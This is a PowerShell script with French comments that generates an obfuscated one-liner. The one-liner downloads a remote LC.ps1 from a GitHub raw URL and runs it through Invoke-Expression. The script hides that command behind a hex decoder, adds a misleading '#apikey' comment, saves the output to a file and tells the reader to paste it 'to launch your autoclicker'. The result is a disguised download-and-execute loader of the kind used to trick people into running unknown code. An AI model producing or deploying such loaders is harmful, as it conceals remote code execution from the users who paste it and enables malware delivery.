# Script d'obfuscation pour créer une commande hex comme le pote

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ([string]::IsNullOrEmpty($scriptDir)) {
    $scriptDir = Get-Location
}

# Lire LC.ps1
$lcPath = Join-Path $scriptDir "LC.ps1"
if (-not (Test-Path $lcPath)) {
    Write-Host "ERREUR: LC.ps1 introuvable dans $scriptDir" -ForegroundColor Red
    exit 1
}

$lcContent = Get-Content $lcPath -Raw

# Créer la commande qui télécharge et exécute LC.ps1
$url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/LC.ps1"
$command = "Invoke-RestMethod -Uri `"$url`" | Invoke-Expression"

Write-Host "Commande originale:" -ForegroundColor Yellow
Write-Host $command -ForegroundColor Gray
Write-Host ""

# Fonction pour convertir un string en hex
function String-ToHex {
    param([string]$str)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
    $hex = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ''
    return $hex
}

# Fonction pour créer le décodeur hex (première partie avec &)
function Create-HexDecoderFirst {
    return '&(&{$a=$args[0];$r='''';for($i=0;$i-lt$a.Length;$i=$i+2){$r+="$([char](0+(''0x''+$a[$i]+$a[$i+1])))"};$r}'
}

# Fonction pour créer le décodeur hex (deuxième partie sans &)
function Create-HexDecoderSecond {
    return '(&{$a=$args[0];$r='''';for($i=0;$i-lt$a.Length;$i=$i+2){$r+="$([char](0+(''0x''+$a[$i]+$a[$i+1])))"};$r}'
}

# Convertir en hex
$hexCommand = String-ToHex -str $command
$hexIEX = String-ToHex -str "IEX"

Write-Host "Encodage en hex..." -ForegroundColor Yellow
Write-Host "IEX en hex: $hexIEX" -ForegroundColor Gray
Write-Host "Commande en hex: $hexCommand" -ForegroundColor Gray
Write-Host ""

# Créer la commande obfusquée (comme le pote)
$decoderFirst = Create-HexDecoderFirst
$decoderSecond = Create-HexDecoderSecond
$obfuscated = "$decoderFirst '$hexIEX') $decoderSecond '$hexCommand') #apikey"

Write-Host "Commande obfusquee:" -ForegroundColor Green
Write-Host $obfuscated -ForegroundColor Cyan
Write-Host ""

# Sauvegarder dans un fichier
$outputPath = Join-Path $scriptDir "COMMANDE-OBFUSQUEE.txt"
$obfuscated | Out-File $outputPath -Encoding ASCII -NoNewline
Write-Host "Commande sauvegardee dans: $outputPath" -ForegroundColor Green
Write-Host ""
Write-Host "Copie-colle cette commande pour lancer ton autoclicker!" -ForegroundColor Yellow

